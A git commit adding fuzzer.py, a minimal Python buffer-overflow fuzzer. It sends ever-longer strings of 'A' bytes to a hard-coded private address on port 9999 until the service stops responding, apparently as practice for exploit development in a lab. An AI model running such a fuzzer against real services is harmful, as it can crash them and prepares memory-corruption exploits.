54eb40c03979515e86ca880d031a1deedfefbce2
Tripnotize <83658067+Tripnotize@users.noreply.github.com>
2021-08-01 17:23:14 +0530

    Add files via upload

---
+++ fuzzer.py
@@ -0,0 +1,27 @@
+#!/usr/bin/env python
+
+import socket, sys, time
+
+ip = '192.168.42.240'
+port = 9999
+
+buffer = b"A" * 100
+timeout = 5
+
+while True:
+	try:
+		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+		s.connect((ip,port))
+		s.settimeout(timeout)
+		s.recv(1024)
+		print("[*] Fuzzing with " + str(len(buffer)) +" bytes")
+		s.send(buffer + b'\r\n')
+		s.recv(1024)
+		
+	except:
+		print("[-] Fuzzing stopped at " + str(len(buffer)) + " bytes")
+		sys.exit()
+	
+	buffer += b"A" * 100
+	time.sleep(1)
+	
